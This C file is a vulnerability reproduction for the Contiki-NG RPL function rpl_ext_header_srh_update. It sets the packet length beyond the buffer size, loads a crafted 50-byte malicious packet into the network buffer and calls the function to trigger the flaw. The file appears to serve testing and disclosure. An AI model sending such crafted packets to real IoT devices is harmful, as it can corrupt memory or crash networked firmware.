/**
 * @file vuln-rpl-ext-header-srh-update.c
 * @author Owen Cochell (owencochell@gmail.com)
 * @brief Vulnerability reproduction for rpl_ext_header_srh_update
 * @version 0.1
 * @date 2024-08-10
 * 
 * @copyright Copyright (c) 2024
 * 
 */

#include "contiki.h"
#include "net/ipv6/uip.h"
#include "net/ipv6/uipbuf.h"
#include "net/routing/rpl-classic/rpl.h"
#include "net/routing/rpl-classic/rpl-conf.h"

#include <stdio.h> /* For printf() */
#include <stdlib.h>

extern uint16_t uip_len;
extern uip_buf_t uip_aligned_buf;

/*---------------------------------------------------------------------------*/
PROCESS(rpl_vuln_process, "RPL Vuln Process");
AUTOSTART_PROCESSES(&rpl_vuln_process);
/*---------------------------------------------------------------------------*/
PROCESS_THREAD(rpl_vuln_process, ev, data)
{
    PROCESS_BEGIN();

    // Set uip_len to be very large:

    uip_len = UIP_BUFSIZE + 10;

    // Copy dangerous packet to uipbuf:

    uint8_t mal_packet[50] = {0, 159, 0, 245, 160, 160, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 122, 0, 0, 0, 0, 0, 0, 0, 0};

    memcpy(uip_buf, mal_packet, 50);

    // Call function:

    rpl_ext_header_srh_update();

    printf("Done\n");

    exit(0);

    PROCESS_END();
}
/*---------------------------------------------------------------------------*/
